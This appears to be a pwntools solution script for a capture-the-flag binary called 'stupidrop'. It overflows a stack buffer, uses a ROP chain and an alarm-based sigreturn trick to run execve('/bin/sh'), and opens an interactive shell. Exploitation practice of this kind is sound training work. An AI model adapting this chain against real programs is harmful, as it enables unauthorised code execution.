from signal import alarm
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
file = "./stupidrop"


def exeBinSh(target, elf):
  rop = ROP(elf)
  syscallAddress = rop.find_gadget(["syscall"]).address
  bssAddress = 0x601050

  popRdiAddress = p64(rop.find_gadget(["pop rdi", "ret"]).address)
  getsAddress = p64(elf.symbols["gets"])
  alarmAddress = p64(elf.symbols["alarm"])

  sigreturnFrame = SigreturnFrame()
  sigreturnFrame.rip = syscallAddress
  sigreturnFrame.rax = 0x3b  # execve
  sigreturnFrame.rdi = bssAddress
  sigreturnFrame.rsi = 0x0
  sigreturnFrame.rdx = 0x0

  payload = b"a" * 0x38 \
      + popRdiAddress \
      + p64(bssAddress) \
      + getsAddress \
      + popRdiAddress \
      + p64(0xf) \
      + alarmAddress \
      + popRdiAddress \
      + p64(0x0) \
      + alarmAddress \
      + p64(syscallAddress) \
      + bytes(sigreturnFrame)

  target.sendline(payload)
  target.sendline(b"/bin/sh\x00")


def main():
  elf = ELF(file)
  target = process(file)
  exeBinSh(target, elf)
  target.interactive()


if __name__ == "__main__":
  main()
